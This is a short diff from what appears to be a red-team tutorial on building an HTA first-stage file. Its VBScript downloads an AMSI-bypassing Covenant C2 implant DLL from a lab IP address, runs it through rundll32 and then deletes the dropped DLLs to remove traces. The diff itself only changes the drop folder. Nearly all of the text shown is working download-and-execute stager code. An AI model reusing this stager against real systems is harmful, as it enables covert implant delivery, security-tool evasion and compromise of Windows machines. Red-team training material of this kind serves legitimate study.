@@ -643,7 +643,7 @@ First of all we need to craft our HTA (first stage) file that will deliver our G
 ' ===================================
 ' Download Clause
 ' Tested with binaries - works!
-HTTPDownload "http://192.168.152.100:1234/covenant-DLL-noAmsi.dll", "C:\Windows\Tasks"
+HTTPDownload "http://192.168.152.100:1234/covenant-DLL-noAmsi.dll", "C:\tmp"
 
 Sub HTTPDownload( myURL, myPath )
 
@@ -691,7 +691,7 @@ End Sub
 Dim sh  
 Set sh = CreateObject("Wscript.Shell")  
 Call sh.Run("rundll32 covenant-DLL-noAmsi.dll,MonkEntry")
-target_folder = "C:\Windows\Tasks"
+target_folder = "C:\tmp"
 Set fs = CreateObject("Scripting.Filesystemobject")
 fs.DeleteFile( target_folder & "\*.dll" )
 Set sh = Nothing 
